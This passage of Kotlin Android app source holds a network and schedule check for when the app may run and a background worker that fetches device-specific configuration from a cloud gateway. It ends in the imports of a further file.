        if (mode == "WIFI_ONLY") {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            return caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true
        }

        if (mode == "SCHEDULED") {
             val start = global.optString("start", "00:00")
             val end = global.optString("end", "23:59")
             return isTimeBetween(start, end)
        }

        return true
    }

    private fun isTimeBetween(start: String, end: String): Boolean {
        try {
            val now = Calendar.getInstance()
            val current = now.get(Calendar.HOUR_OF_DAY) * 60 + now.get(Calendar.MINUTE)

            val (sh, sm) = start.split(":").map { it.toInt() }
            val (eh, em) = end.split(":").map { it.toInt() }
            val sMin = sh * 60 + sm
            val eMin = eh * 60 + em

            return current in sMin..eMin
        } catch(e: Exception) {
            return true // Fallback to allow operation if schedule config is corrupted
        }
    }
}

package com.example.myandroid

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class ConfigSyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(applicationContext)
                val supabaseUrl = SecretVault.getGatewayUrl(applicationContext)
                val supabaseKey = SecretVault.getLock(applicationContext)

                val req = JSONObject()
                req.put("action", "get_config")
                req.put("deviceId", deviceId)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { it.write(req.toString().toByteArray()) }

                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val data = respObj.optJSONObject("data")
                        if (data != null && data.has("config_json")) {
                            val configJson = data.getJSONObject("config_json")
                            ConfigManager.updateConfig(applicationContext, configJson.toString())
                            DebugLogger.log("CONFIG_SYNC", "Config updated from cloud")
                        } else {
                            DebugLogger.log("CONFIG_SYNC", "No config found for device")
                        }
                        Result.success()
                    } else {
                        DebugLogger.log("CONFIG_SYNC_ERR", "Gateway Error: ${respObj.optString("error")}")
                        Result.retry()
                    }
                } else {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("CONFIG_SYNC_ERR", "HTTP ${conn.responseCode} | $err")
                    Result.retry()
                }
            } catch (e: Exception) {
                DebugLogger.log("CONFIG_SYNC_ERR", "Exception: ${e.message}")
                Result.retry()
            }
        }
    }
}

package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.BatteryManager
